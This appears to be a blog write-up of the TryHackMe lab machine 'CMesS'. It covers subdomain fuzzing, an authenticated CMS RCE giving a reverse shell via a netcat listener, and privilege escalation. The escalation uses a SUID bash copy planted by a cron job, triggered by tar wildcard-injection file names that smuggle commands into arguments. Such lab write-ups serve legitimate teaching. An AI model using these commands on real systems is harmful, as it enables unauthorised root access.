---
title: /writeups/CMesS
layout: post
permalink: /writeups/CMesS
---
Writeup of THM Machine called <a href="https://tryhackme.com/r/room/cmess">"CMesS"</a>

The only interesting thing in the nmap scan is the port 80 so that'll be the place to start.

Unfortunately there's nothing interesting on the default page, and dirbusting gives us nothing either besides the /admin login portal.
However, after running wfuzz:
`wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107` (the `--hl 107` filters the results for us to exclude the 404s)
We can find interesting dev.cmess.thm.

<img src="/images/DevCmess.png" alt="dev.cmess.thm" />

And there's obviously an email and a password that we can use to login on /admin found earlier

After we log in, the admin page greets us with the version of the CMS

<img src="/images/VersionCmess.png" alt="cmess version" />

Searchsploit tells us that there's an authenticated RCE for that exact version.
You can get the exploit [here](https://www.exploit-db.com/exploits/51569)

<img src="/images/ExploitCmess.png" alt="cmess exploit" />

The exploit obviously works and gives us a www-data shell (Remember to start the listener before running the exploit! `nc -lvnp <port>')

#PrivEsc

I think that the PrivEsc is actually the hardest part of this box. 
Running both Linpeas and LinEnum gives us 2 interesting findings.

The first one is the crontab

<img src="/images/LinPeasCmess.png" alt="cmess Crontab finding" />

We can clearly see that it's vulnerable to wildcard injection but we are not able to exploit it yet because we do not have access to the `/home/andre/backup`

For some reason the LinPeas was extremely slow on this machine so I decided to run LinEnum and it gave me this:

<img src="/images/LinEnumCmess.png" alt="LinEnum finding" />

It turns out that this file contains the andre's password

<img src="/images/AndreCmess.png" alt="Andre passwd" />

Now, we've got every piece of information needed to root this machine.

First, we ssh as andre:
`ssh andre@<ip>`
and provide the password found in the backup file.

Thanks to that, we have access to `/home/andre/backup`, so let's cd there.
`cd /home/andre/backup`

Now we can proceed with the wildcard injection...
`nano shell.sh`
In the nano  we write:
```
#!/bin/bash
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```
Now, we have to create some files to make the cron execute our shell.sh
```
echo "" > "--checkpoint-action=exec=sh shell.sh"  
echo "" > --checkpoint=1
```
And now we wait.

After a minute we should see a SUID copy of bash in the /tmp directory.
To get the root we simply run it:
<img src="/images/RootCmess.png" alt="Root CMess" />

Thank you for reading
